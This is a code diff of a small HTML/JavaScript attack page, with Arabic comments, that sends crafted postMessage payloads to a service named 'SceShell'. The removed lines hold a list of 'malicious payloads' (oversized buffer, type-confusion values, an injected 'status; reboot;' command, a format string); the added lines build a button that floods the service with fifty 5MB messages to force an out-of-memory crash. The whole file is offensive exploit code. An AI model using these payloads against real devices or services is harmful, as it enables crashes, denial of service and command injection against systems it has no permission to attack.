@@ -1,21 +1,20 @@
 <script>
-    window.addEventListener('message', (event) => {
-        alert("RESPONSE: " + JSON.stringify(event.data));
-    });
+    // بدلاً من إرسال رسالة واحدة، سنرسل "سلسلة" من الطلبات الكبيرة جداً
+    // لإجبار الـ Service على حجز ذاكرة متتالية
+    let bigPayload = "A".repeat(1024 * 1024 * 5); // 5MB لكل طلب
 
-    const maliciousPayloads = [
-        // 1. اختبار الحجم (Buffer Overflow)
-        {cmd: 'a'.repeat(10000), target: 'SceShell'},
-        // 2. اختبار القيم غير المتوقعة (Type Confusion)
-        {cmd: null, target: 12345},
-        // 3. اختبار الحقن (Injection Attempt)
-        {cmd: 'status; reboot;', target: 'SceShell'},
-        // 4. اختبار الـ Format String (אם ممكن)
-        {cmd: '%s%s%s%s%n', target: 'SceShell'}
-    ];
+    function triggerOOM() {
+        for (let i = 0; i < 50; i++) {
+            window.postMessage({
+                cmd: 'execute', 
+                target: 'SceShell', 
+                data: bigPayload + i 
+            }, '*');
+        }
+    }
 
-    maliciousPayloads.forEach(p => {
-        window.postMessage(p, '*');
-    });
+    // زر للبدء
+    document.body.innerHTML = '<button onclick="triggerOOM()" style="padding:50px; font-size:30px;">TRIGGER OOM</button>';
 </script>
+
 
